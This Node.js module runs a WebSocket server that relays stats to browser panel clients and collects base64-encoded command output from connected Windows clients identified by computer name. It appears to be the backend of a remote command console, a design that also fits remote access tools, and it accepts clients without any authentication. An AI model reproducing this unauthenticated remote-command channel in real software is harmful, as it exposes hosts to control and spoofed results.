const WebSocket = require('ws');
const systemMonitor = require('../services/systemMonitor');
const { getStats } = require('../controllers/stats.controller');
const commandConsole = require('../services/commandConsole');

let socketList = [];
let wss;

function broadcastToWebClients(message) {
    for (let i = 0; i < socketList.length; i++) {
        if (!socketList[i].computerName) {
            socketList[i].send(message);
        }
    }
}

function initWebSocketServer(server) {
    wss = new WebSocket.Server({ server });

    setInterval(() => {
        const msg = JSON.stringify({ type: 'stats', data: getStats() });
        socketList.forEach(s => {
            if (!s.computerName) {
                try { s.send(msg); } catch (e) {}
            }
        });
    }, 5000);

    wss.on('connection', (ws, req) => {
        const ipAddress = req.connection.remoteAddress;
        ws.ipAddress = ipAddress;
        ws.lastActiveTime = new Date();

        socketList.push(ws);

        sendBroadcastToWebPanel();
        if(systemMonitor.getLatest) {
            // send latest metrics on connection
            const metrics = systemMonitor.getLatest();
            if(metrics && Object.keys(metrics).length) {
                ws.send(JSON.stringify({ type: 'system_metrics', payload: metrics }));
            }
        }

        ws.on('message', (message) => {
            handleClientMessage(ws, message);
            sendBroadcastToWebPanel();
        });

        ws.on('close', () => {
            for (let i = 0; i < socketList.length; i++) {
                if (socketList[i] === ws) {
                    socketList.splice(i, 1);  // Remove the socket from the array
                    break;  // Exit loop once the socket is found and removed
                }
            }

            sendBroadcastToWebPanel();
        });
    });

    console.log('WebSocket server initialized');
    systemMonitor.subscribe((data) => {
        broadcast('system_metrics', data);
    });
}

function sendBroadcastToWebPanel() {
    broadcastToWebClients("reload");
}

function broadcast(type, payload) {
    if (!wss) return;
    const message = JSON.stringify({ type, payload });
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(message);
        }
    });
}

function handleClientMessage(ws, messageBuffer) {
    const decoder = new TextDecoder('utf-8');
    const stringMessage = decoder.decode(messageBuffer);

    if(stringMessage == "reload") {
        return;
    }

    const result = stringMessage.split("sep-x8jmjgfmr9");

    if(result[0] == "FROM_WIN_CLIENT") {
        if(result[1] == "CS_SEND_COMPUTERNAME") {
            ws.computerName = result[2];
        } else if(result[1] == "COMMAND_RESULT") {
            try {
                const output = Buffer.from(result[2], 'base64').toString('utf8');
                commandConsole.addResponse(ws.ipAddress, ws.computerName, output);
            } catch (e) {
                console.error('Failed to decode command result', e);
            }
        }
    }
}

module.exports = {
    initWebSocketServer,
    socketList,
    wss,
    broadcastToWebClients,
    broadcast
};
